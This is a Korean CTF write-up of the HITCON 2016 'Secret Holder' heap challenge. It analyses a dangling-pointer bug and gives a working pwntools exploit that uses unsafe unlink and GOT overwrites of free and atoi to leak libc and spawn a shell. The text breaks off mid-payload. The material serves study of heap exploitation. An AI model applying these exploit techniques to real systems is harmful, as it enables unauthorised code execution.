---
title: "Pwn-Secret Holder(100) - Solved by 30 Teams"
sidebar_position: 1
---


## **Information**

### **Description**
```
Break the Secret Holder and find the secret.  
nc 52.68.31.117 5566

[SecretHolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8)
```
### **Files**

* [SecretHolder\_d6c0bed6d695edc12a9e7733bedde182554442f8](/attachments/7536650/7537023.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536650/7537036.bin)

### **Source Code**

* [SecretHolder.c](/attachments/7536650/7537037.c)

## **Writeup**

### **File information**

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ file SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1d9395599b8df48778b25667e94e367debccf293, stripped
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ checksec.sh --file SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$
```

### **libcary analysis**

* **해당 문제를 실행하면 다음과 같은 메뉴를 출력합니다.**
  + Keep secret(비밀 보관)
  + Wipe secret(비밀 지우기)
  + Renew secret(비밀 갱신)

```sh title="Menu"
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ ./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
```

#### **Keep secret**

* **해당 기능을 실행하면 다음과 같은 메뉴를 출력합니다.**
  + Small secret
  + Big secret
  + Huge secret

```sh title="Select"
Which level of secret do you want to keep?
1. Small secret
2. Big secret
3. Huge secret
```

* **다음은 "Keep secret" 기능에 대한 코드를 분석해 보겠습니다.**
  + 해당 함수는calloc()함수를 이용하여 3가지 크기에 대한 Secret을 저장합니다.
    - Small secret는 40 byte를 할당합니다.
    - Big secret는 4000 byte를 할당합니다.
    - Huge secret는 400000 byte를 할당합니다.
  + **메모리 영역 할당 여부를 전역 변수에 저장합니다.**(set 1)****
    - GlobalHugeFlag
    - GlobalBigFlag
    - GlobalSmallFlag
  + **할당된 메모리 영역의 주소 값은 전역 변수에 저장됩니다.**
    - GlobalSmall
    - GlobalBig
    - GlobalHuge
  + 그리고 read()함수를 이용하여 할당된 공간에 값을 저장합니다.

```c title="KeepSecret()"
__int64 KeepSecret()
{
  int command; // eax@1
  char tmp; // [rsp+10h] [rbp-10h]@1
  __int64 canary; // [rsp+18h] [rbp-8h]@1

  canary = *MK_FP(__FS__, 40LL);
  puts("Which level of secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( !GlobalBigFlag )
    {
      GlobalBig = calloc(1uLL, 4000uLL);
      GlobalBigFlag = 1;
      puts("Tell me your secret: ");
      read(0, GlobalBig, 4000uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( !GlobalHugeFlag )
    {
      GlobalHuge = calloc(1uLL, 400000uLL);
      GlobalHugeFlag = 1;
      puts("Tell me your secret: ");
      read(0, GlobalHuge, 400000uLL);
    }
  }
  else if ( command == 1 && !GlobalSmallFlag )
  {
    GlobalSmall = calloc(1uLL, 40uLL);
    GlobalSmallFlag = 1;
    puts("Tell me your secret: ");
    read(0, GlobalSmall, 40uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ canary;
}
```

:::note[calloc]
|  |  |
| --- | --- |
| Header | stdlib.h |
| Type | **void** \*calloc(size\_t nelem, size\_t elsize); |
| Description | malloc()가 바이트 단위로 메모리를 요청한다면 특정 크기에 대한 개수 만큼을 메모리로 요청할 수 있습니다. |
| Arg | size\_t nelem  size\_t elsize |
| Return | **void** \* 할당된 메모리 포인터 NULL 메모리 할당에 실패 |
:::

#### **Wipe secret**

* **해당 기능을 실행하면 다음과 같은 메뉴를 출력합니다.**
  + Small secret
  + Big secret
  + Huge secret

```sh title="Wipe secret menu"
Which Secret do you want to wipe?
1. Small secret
2. Big secret
3. Huge secret
```

* **다음은 "Wipe secret" 기능에 대한 코드를 분석해 보겠습니다.**
  + 해당 함수는 free()함수를 이용하여 Keep secret 함수를 통해 할당된 메모리 영역을 해제합니다.
  + 메모리 영역 해체 여부를 전역 변수에 저장합니다.(set 0)
* **취약성은 여기서 발생합니다.**
  + 메모리를 해제할 때 전역 변수에 저장한 값을 초기화 하지 않습니다.
  + 메모리 할당과 해제를 반복해 **모든 전역변수에 동일한 주소를 저장 할 수 있습니다.**
* **해당 취약성에 의해 또 다른 취약성이 발생합니다.**
  + 앞에서 설명한 취약점을 이용해 **flag 전역변수의 값을 변경하지 않고 Heap 영역을 해제 할 수 있습니다.**
  + Heap 영역을 해제 할 때 free() 함수에 전달되는 값을 할당 받은 Heap의 주소 값 입니다.

```c title="WipeSecret()"
__int64 WipeSecret()
{
  int command; // eax@1
  char s; // [rsp+10h] [rbp-10h]@1
  __int64 v3; // [rsp+18h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  command = atoi(&s);
  switch ( command )
  {
    case 2:
      free(GlobalBig);
      GlobalBigFlag = 0;
      break;
    case 3:
      free(GlobalHuge);
      GlobalHugeFlag = 0;
      break;
    case 1:
      free(GlobalSmall);
      GlobalSmallFlag = 0;
      break;
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

#### **Renew secret**

* **해당 기능을 실행하면 다음과 같은 메뉴를 출력합니다.**
  + Small secret
  + Big secret
  + Huge secret

```sh title="Renew secret menu"
Which Secret do you want to renew?
1. Small secret
2. Big secret
3. Huge secret
```

* **해당 함수는 다음과 같은 기능을 합니다.**  
  + 해당 함수는 메모리 할당 여부를 전역 변수를 이용하여 확인 후 read() 함수를 이용하여 선택한 영역에 새로운 내용을 작성합니다.

```c title="RenewSecret()"
__int64 RenewSecret()
{
  int command; // eax@1
  char tmp; // [rsp+10h] [rbp-10h]@1
  __int64 canary; // [rsp+18h] [rbp-8h]@1

  canary = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( GlobalBigFlag )
    {
      puts("Tell me your secret: ");
      read(0, GlobalBig, 4000uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( GlobalHugeFlag )
    {
      puts("Tell me your secret: ");
      read(0, GlobalHuge, 400000uLL);
    }
  }
  else if ( command == 1 && GlobalSmallFlag )
  {
    puts("Tell me your secret: ");
    read(0, GlobalSmall, 40uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ canary;
}
```

### Debuging

#### **Allocated**

* **분석을 위해 다음과 같이 Break point를 설정합니다.**
  + 0x400925 : GlobalSmall = calloc(1uLL, 40uLL)
  + 0x400981 : GlobalBig = calloc(1uLL, 4000uLL)
  + 0x4009D7 : GlobalHuge = calloc(1uLL, 400000uLL)

```sh title="Debug point"
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$ gdb -q ./Sec*
Reading symbols from ./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8...(no debugging symbols found)...done.
gdb-peda$ b *0x400925
Breakpoint 1 at 0x400925
gdb-peda$ b *0x400981
Breakpoint 2 at 0x400981
gdb-peda$ b *0x4009D7
Breakpoint 3 at 0x4009d7
gdb-peda$
```

* **다음과 같이 디버깅을 통해 GlobalSmall 전역변수의 주소와 할당받은 영역의 주소 값을 확인 할 수 있습니다.**
  + 프로그램 실행 순서 : "Keep secret" → "Small secret"
  + "GlobalSmall" 전역 변수의 주소는 0x6020b0 입니다.
  + 할당받은 Heap의 주소는 0x603010 입니다.

```sh title="GlobalSmall = calloc(1uLL, 40uLL)"
Breakpoint 1, 0x0000000000400925 in ?? ()
gdb-peda$ x/i $rip
=> 0x400925:	mov    QWORD PTR [rip+0x201784],rax        # 0x6020b0
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$
```

* **다음과 같이 디버깅을 통해 GlobalBig 전역변수의 주소와 할당받은 영역의 주소 값을 확인 할 수 있습니다.**
  + 프로그램 실행 순서 : "Wipe secret" → "Small secret" → "KeepSecret" → "Big secret"
  + "GlobalBig" 전역 변수의 주소는 0x6020a0 입니다.
  + 할당받은 Heap의 주소는 0x603010 입니다.

```sh title="GlobalBig = calloc(1uLL, 4000uLL)"
gdb-peda$ c
Continuing.
...

Breakpoint 2, 0x0000000000400981 in ?? ()
gdb-peda$ x/i $rip
=> 0x400981:	mov    QWORD PTR [rip+0x201718],rax        # 0x6020a0
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$
```

* ****다음과 같이 디버깅을 통해 GlobalHuge 전역변수의 주소와 할당받은 영역의 주소 값을 확인 할 수 있습니다.****
  + 프로그램 실행 순서 : "Wipe secret" → "Big secret" → "KeepSecret" → "Huge secret"
  + "GlobalHuge" 전역 변수의 주소는 0x6020a8 입니다.
  + 할당받은 Heap의 주소는 0x7ffff7f73010 입니다.
* **그러나 "GlobalHuge"에 할당 받은 주소는 "Small secret", "Big secret"에서 할당 받은 주소와 다릅니다.**
  + 해당 이유는 바로 사용가능한 메모리의 크기가 작기 때문입니다.
    - malloc은 초기에 Heap으로 사용가능한 공간을 생성합니다.
      * 해당 공간 초기의 크기는 0x21000 입니다.
  + 아래와 같이 main\_arena의 "system\_mem", "max\_system\_mem"영역의 정보를 이용해 사용가능한 메모리의 크기를 알 수 있습니다.

```sh title="GlobalHuge = calloc(1uLL, 400000uLL)"
gdb-peda$ c
Continuing.
...

Breakpoint 1, 0x0000000000400925 in ?? ()
gdb-peda$ c
Continuing.
...

Breakpoint 3, 0x00000000004009d7 in ?? ()
gdb-peda$ x/i $rip
=> 0x4009d7:	mov    QWORD PTR [rip+0x2016ca],rax        # 0x6020a8
gdb-peda$ i r rax
rax            0x7ffff7f73010	0x7ffff7f73010

gdb-peda$ p main_arena.system_mem 
$1 = 0x21000
gdb-peda$ p main_arena.max_system_mem 
$2 = 0x21000
gdb-peda$ info proc map
process 68905
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x603000           0x624000    0x21000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7f73000     0x7ffff7fd8000    0x65000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

* ****다음과 같은 방법으로 "GlobalHuge"전역 변수에**"Small secret", "Big secret"에서 할당 받은 주소와 같은 주소 할당 받을 수 있습니다.**  
  + 프로그램 실행 순서 : "Wipe secret" → "Huge secret" → "KeepSecret" → "Huge secret"
  + malloc는 기존에 확보한 공간의 크기로는 "Huge secret"에서 요청한 크기를 할당 할 수 없기 때문에 추가적인 Heap 공간을 확보합니다.
  + 이전에 할당 받은 "Huge secret"을 해제 후 새로 할당하면 "Small secret", "Big secret"에서 할당 받은 주소와 같은 주소 할당 받을 수 있습니다.

```sh title="GlobalHuge = calloc(1uLL, 400000uLL)"
Breakpoint 3, 0x00000000004009d7 in ?? ()
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$ p main_arena.system_mem 
$9 = 0x82000
gdb-peda$ p main_arena.max_system_mem 
$10 = 0x82000
gdb-peda$ info proc map
process 68905
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x603000           0x685000    0x82000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fd5000     0x7ffff7fd8000     0x3000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

### Structure of Exploit code

* Payload의 순서는 다음과 같습니다.

:::note[Payload Flow]
1. Heap memory 할당
2. unsafe unlink
3. libc base 주소 추출
4. offset 추출
5. Shell 실행
:::

* 이를 조금더 자세하게 설명하면 다음과 같습니다.

:::note[Detailed description]
1. Heap memory 할당
   1. Keep → "small secret"
   2. Free → "small secret"
   3. Keep → "big secret"
   4. Free → "small secret"
   5. Keep → "huge secret"
   6. Free → "huge secret"
   7. Keep → "small secret"
   8. Keep → "huge secret"
2. unsafe unlink
   1. "big secret"영역에 unsafe unlink을 위한 chunk 구조 작성
   2. 전역 변수 "GlobalSmall"에 "0x602098(.bss영역 주소)" 저장
3. Leak libc addresss  
   1. "Renew secret"를 이용하여 전역 변수 "GlobalBig"에 "free() 함수의 .got" 저장
   2. "Renew secret"를 이용하여 "free() 함수의 .got.plt 값"을 "puts()함수의 .plt 주소"로 변경
   3. 전역 변수 "GlobalBig"에 "\_\_read에 대한 .got" 저장
   4. free 함수 호출
4. offset 추출
   1. leak addresss - read offset = libc base
   2. libc base + system offset = libc system
5. Shell 실행
   1. "Renew secret"를 이용하여 전역 변수 "GlobalBig"에 "atoi()함수의 .got.plt 주소" 저장
   2. "atoi()함수의 .got.plt 주소"에 "\_\_libc\_system" 주소 저장
   3. "sh" 문자 입력
:::

* payload를 바탕으로 공격을 위해 알아내어야 할 정보는 다음과 같습니다.

:::note[List of information to check]
* Heap memory 할당
* unsafe unlink을 위한 chunk 구조
* Leak libc addresss
* system offset
* free, atoi의 ".got.plt" 주소
:::

### **Information for attack**

#### **Allocated**

* **unsafe unlink을 진행하기 위해서는 메모리의 형태가 Heap overflow를 통해 chunk 구조 변경이 가능한 형태가 필요합니다.**
* **다음과 같은 방법으로 unsafe unlink이 가능한 메모리 형태를 만들수 있습니다.**
  + "small secret"을 이용하여 unsafe unlink을 위한 chunk 값을 저장할 수 있는 메모리 공간을 확보합니다.
  + "big secret"을 이용하여 small 다음 영역에 저장되어 있는 chunk정보를 변경합니다.
  + "huge secret"은 small영역 뒤에 할당하여 unsafe unlink 대상이 되도록합니다.
* **다음과 같은 방법으로 공격을 위해 필요한 메모리 구조를 생성 합니다.**  
  + Keep → "small secret"
  + Wipe → "small secret"
  + Keep → "Big secret"
  + Wipe → "small secret"
  + Keep → "huge secret"
  + Wipe→ "huge secret"
  + Keep → "small secret"
  + Keep → "huge secret"
* **앞에서 Keep → "Big secret"을 이용하여 공간을 생성한 후 Wipe를 이용하여 "Small secret"를 하는 이유는 다음과 같습니다.**
  + Heap overflow를 만들기 위해서는 GlobalSmall, GlobalBig 에 저장되는 값이 동일해야 합니다.
  + 그리고 두 영역다 "Renew secret"를 이용하여 쓰기가 가능해야 합니다.
  + 그러나 Keep → "Big secret" 후 Wipe → "Big secret"을 하게 되면 GlobalBigFlag의 값이 '0'으로 변경되기 때문에 해당 영역에 값을 저장할 수 없습니다.
  + 하지만 Keep → "Big secret" 후 Wipe → "Small secret"을 하게 되면 GlobalBigFlag는 값의 변화가 없습니다.
  + 그렇기 때문에 free() 후에도 "Renew secret"를 이용하여 GlobalBig 에 저장된 영역에 값을 저장할 수 있게 됩니다.
* **unsafe unlink이 발생하는 메모리 형태**
  + 노란색 :"small secret"에 할당된 chunk
  + 파란색 :할당된 "small secret" 영역
  + 빨간색 :"huge secret"에 할당된 chunk
  + 초록색 :할당된 "huge secret" 영역

:::note[Heap Memory struct]
|  | 0x0 | 0x8 |
| --- | --- | --- |
| 0x603000 | 0x0000000000000000 | 0x0000000000000031 |
| 0x603010 | 0x0000000a42424242 | 0x0000000000000000 |
| 0x603020 | 0x0000000000000000 | 0x0000000000000000 |
| 0x603030 | 0x0000000000000000 | 0x0000000000061a91 |
| 0x603040 | 0x0000000a64646464 | 0x0000000000000000 |
:::

:::note[전역 변수 정보]
* GlobalBig[0x6020a0] : 0x603010
* GlobalHuge[0x6020a8] : 0x603040
* GlobalSmall[0x6020b0] : 0x603010
:::

#### **unsafe unlink을 위한 Free Chunk 설계**

* **unsafe unlink를 이해하기 위해 free()함수 호출시 사용되는 unlink() 매크로와 free chunk의 구조에 대한 이해가 필요합니다.**
  + unsafe unlink은 할당된 Heap 메모리를 free()함수를 통해 해제되는 순간 발생하는 취약성입니다.
* **Free chunk 구조는 다음과 같습니다.**

```cpp title="struct malloc_chunk"
struct malloc_chunk
{
  INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */
  INTERNAL_SIZE_T size;      /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;   /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
```

* **아래의 unlink() 매크로의 코드에 의해 취약성이 발생합니다.**

```cpp title="unlink() macro"
#define unlink( P, BK, FD ) {
    BK = P->bk;
    FD = P->fd;
    FD->bk = BK;
    BK->fd = FD;
}
```

* **unsafe unlink 취약성이 발생하는 Free Chunk 구조는 다음과 같습니다.**
  + 0x603010 ~ 0x60302f 영역에는 Free chunk 구조를 저장합니다.
  + 0x603030 영역에 이전 청크의 크기를 저장합니다.
  + 0x603038 영역에 이전 청크가 할당되지 않은 영역이라 표시하기 위해, 저장된 값에서 PREV\_INUS 값을 제거 한 0x61a90 값을 저장합니다.

:::note[Unlink attack이 발생하는 Chunk 구조]
|  | 0x0 | 0x8 |
| --- | --- | --- |
| 0x603000 | 0x0000000000000000 | 0x0000000000000031 |
| 0x603010 | prev\_size(0x0) | size(0x31) |
| 0x603020 | fd(0x602098) | bk(0x6020a0) |
| 0x603030 | prev\_size(0x20) | 0x61a91 & PREV\_INUSE = 0x61a90 |
| 0x603040 | 0x0000000a64646464 | 0x0000000000000000 |
:::

* **해당 Free chunk를 unlink 매크로에서 어떻게 처리되는지 확인해보겠습니다.**
  + "0x603010" 영역을 해제하면 unlink 매크로에 의해 GlobalSmall(0x6020b0) 전역 변수에 0x602098 주소 값이 저장됩니다.
  + 즉, GlobalSmall을 통해 Stack 영역(전역 변수)의 값을 모두 변경할 수 있게 됩니다.

```cpp title="unlink() macro process"
#define unlink( P, BK, FD ) {
    BK = P->bk;(0x6020a0)
    FD = P->fd;(0x602098)
    FD->bk = BK;(0x602098 + 0x18 = 0x6020a0)
    BK->fd = FD;(0x6020a0 + 0x10 = 0x602098)
}
```

```sh title="Pwn process"
gdb-peda$ x/10gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031
0x603010:	0x0000000000000000	0x0000000000000031
0x603020:	0x0000000000602098	0x00000000006020a0
0x603030:	0x0000000000000020	0x0000000000061a90
0x603040:	0x0000000a44444444	0x0000000000000000
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
3. Huge secret
3
1. Keep secret
2. Wipe secret
3. Renew secret
^C
0x00007ffff7b049b0 in read () from ./libc.so.6_375198810bb39e6593a968fcbcf6556789026743
gdb-peda$ x/gx 0x6020b0
0x6020b0:	0x0000000000602098
gdb-peda$
```

:::note[Detailed explanation of the Unsafe unlink]
* [Unsafe unlink](/technote/technote/heap-exploitati-882/heap-exploitation/unsafe-unlink)
:::

#### **Leak libc addresss**

* **공격을 위해 필요한 libc addresss는 다음과 같은 방법으로 획득 할 수 있습니다.**
  + unsafe unlink 취약성을 이용하여 "GlobalSmall" 변수에 0x602098(.bss 영역)을 저장하였습니다.
  + 공격자는 "GlobalSmall" 변수를 이용해 전역 변수에 저장된 값들을 변경할 수 있습니다.
  - 전역 변수는 0x6020A0 ~ 0x6020C0 영역을 사용
* **"Renew secret" 기능을 이용해 "Small secret"을 선택하여 전역 변수들의 값을 변경할 수 있습니다.**
  + 해당 취약성을 이용해 got, plt의 값을 변경해 필요한 주소 값을 추출하고, shell을 실행 할 수 있습니다.

```sh title="Overwrite to global variable"
gdb-peda$ c
Continuing.
3
Which Secret do you want to renew?
1. Small secret
2. Big secret
3. Huge secret
1
Tell me your secret: 
AAAAAAAAAAAAAAAAAAAABBBB
1. Keep secret
2. Wipe secret
3. Renew secret
^C

0x00007ffff7b049b0 in read () from ./libc.so.6_375198810bb39e6593a968fcbcf6556789026743
gdb-peda$ x/8gx 0x0000000000602098
0x602098:	0x4141414141414141	0x4141414141414141
0x6020a8:	0x4242424241414141	0x000000000060200a
0x6020b8:	0x0000000000000001	0x0000000000000001
0x6020c8:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **다음과 같은 방법으로 기본 주소를 계산 할 수 있는 libc addresss를 추출 할 수 있습니다.**
  + 주소 값 추출을 위해 free()함수의 got 영역을 공격 대상으로 합니다.
  + 앞에서 확인한 취약성을 이용해 GlobalBig[0x6020a0] 영역의 값을 free() 함수의 got 주소로 변경합니다.
  + "Renew secret" 기능을 이용해 "Big secret"의 내용 변경을 요청하면 free() 함수의 got영역에 값을 저장할 수 있습니다.
    - 해당 영역에 puts() 함수의 plt주소를 저장합니다.
  + "Renew secret" 기능을 이용해 "Small secret"을 선택해 GlobalBig[0x6020a0] 영역에 got 영역의 주소 값을 저장합니다.
    - 여기에서는 read() 함수의 got 주소를 사용합니다.
  + "Wipe secret" 기능을 이용해 "Big secret"의 삭제를 요청하면 변경된 free() 함수의 got에 의해 puts() 함수가 호출됩니다.
    - "Big secret"을 선택하였기 때문에 GlobalBig에 저장된 read() 함수의 got 주소가 출력됩니다.
* **다음 스크립트를 이용하여 libc addresss를 추출할 수 있습니다.**
  + read,system 함수에 대한 offset값은 pwntools의 기능을 이용하여 쉽게 확인할 수 있습니다.
  + "libc.symbols['read']", "libc.symbols['system']"

```python title="Leack libc address"
from pwn import *

def keep(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("1")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(size)

def wipe(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
def renew(size,content):
    p.recvuntil("3. Renew secret\n")
    p.sendline("3")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(content)

p = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', env={'LD_PRELOAD': './libc.so.6_375198810bb39e6593a968fcbcf6556789026743'})
bin = ELF('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8')
libc = ELF("libc.so.6_375198810bb39e6593a968fcbcf6556789026743")

size_num = { "small" : "1", "big" : "2", "huge" : "3" }

GlobalSmall = 0x6020B0
GlobalBig = 0x6020A0

#log.info("free got : " + str(hex(bin.got['free'])))
#log.info("read got : " + str(hex(bin.got['read'])))
#log.info("puts plt : " + str(hex(bin.plt['puts'])))
#log.info("atoi got : " + str(hex(bin.got['atoi'])))
#log.info("read offset : " + str(hex(libc.symbols['read'])))
#log.info("system offset : " + str(hex(libc.symbols['system'])))

keep("small")
wipe("small")
keep("big")
wipe("small")
keep("small")
keep("huge")
wipe("huge")
keep("huge")

#Unsafe unlink (Write to heap area)
secret = p64(0)
secret += p64(49)
secret += p64(GlobalSmall - 0x18)
secret += p64(GlobalSmall - 0x10)
secret += p64(32)
secret += p64(400016)
renew("big",secret)
wipe("huge")

#Overwrite to global variable (Write to stack area)
secret = "A"*8 						#0x602098
secret += p64(bin.got['free'])		#GlobalBig  [0x6020a0]:0x603010 -> bin.got['free']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:0x603040 -> "A" * 8
secret += p64(GlobalBig)			#GlobalSmall[0x6020b0]:0x602098 -> 0x6020a0
renew("small",secret)

#Overwrite to GOT of free()
renew("big",p64(bin.plt['puts']))	#bin.got['free']:bin.plt['free'] -> bin.plt['puts'])

#Overwrite to GlobalBig(Set the first argument value.)
renew("small",p64(bin.got['read']))	#GlobalBig  [0x6020a0]:bin.got['free'] -> bin.got['read']

#Call puts(GlobalBig:bin.got['read']) (Print GOT of read().)
wipe("big")
data = p.recvline()

#Leak addresss
readAddr = u64(data[:6] + '\x00\x00')
libcBase = readAddr - libc.symbols['read']
systemAddr = libcBase + libc.symbols['system']
log.info("read addr : " + hex(readAddr))

log.info("libc Base : " + hex(libcBase))

log.info("system addr : " + hex(systemAddr))
```

* **다음은 스크립트를 실행한 결과 입니다.**

```sh title="Get addresss"
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$ python Payload.py 
[+] Starting local process './SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8': pid 69469
[*] '/home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/lazenca0x0/CTF/HITCON/SecretHolder/libc.so.6_375198810bb39e6593a968fcbcf6556789026743'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] free got : 0x602018
[*] read got : 0x602040
[*] puts plt : 0x4006c0
[*] atoi got : 0x602070
[*] read offset : 0xf69a0
[*] system offset : 0x45380
[*] read addr : 0x7f1b543829a0
[*] libc Base : 0x7f1b5428c000
[*] system addr : 0x7f1b542d1380
[*] Stopped process './SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8' (pid 69469)
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$
```

#### **Get shell**

* **앞에서 변경했던 것처럼 atoi()함수의 got 영역에 system() 함수의 주소 값을 저장해 shell을 획득 할 수 있습니다.**

```python title="Write to stack area"
...
##Overwrite to global variable (Write to stack area)
secret = p64(bin.got['atoi']) 		#GlobalBig  [0x6020a0]:bin.got['read'] -> bin.got['atoi']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:"A" * 8 -> "A" * 8
secret += p64(GlobalBig) 			#GlobalSmall[0x6020b0]:0x6020a0 -> GlobalBig[0x6020a0]
secret += p64(1)					#GlobalBigFlag [0x6020b8]:0 -> 1
